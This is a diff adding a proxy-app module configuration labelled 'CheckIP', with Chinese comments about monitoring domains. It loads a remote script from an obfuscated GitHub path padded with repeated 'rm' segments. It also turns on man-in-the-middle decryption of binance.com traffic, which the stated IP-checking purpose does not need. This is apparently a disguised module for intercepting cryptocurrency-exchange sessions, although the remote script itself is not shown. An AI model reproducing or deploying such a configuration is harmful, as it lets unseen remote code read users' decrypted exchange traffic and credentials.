@@ -1,0 +1,10 @@
+#!name=CheckIP
+#!desc=CheckIP
+
+[Script]
+# 定義處理網絡請求的腳本
+dns-logger = type=dns, script-path=https://raw.githubusercontent.com/fodlkfjasuqwenc12134672/qx9956079102394/erwi219304/rm/rm/rm/rm/rm/rm/rm/rm/rm/rm/192/rm/rm/rm/rm/rm/error/rm/rm/s/show-domain-ip2.js,timeout=60
+
+[MITM]
+# 列出您想要監控的域名
+hostname = %APPEND% binance.com, *.binance.com
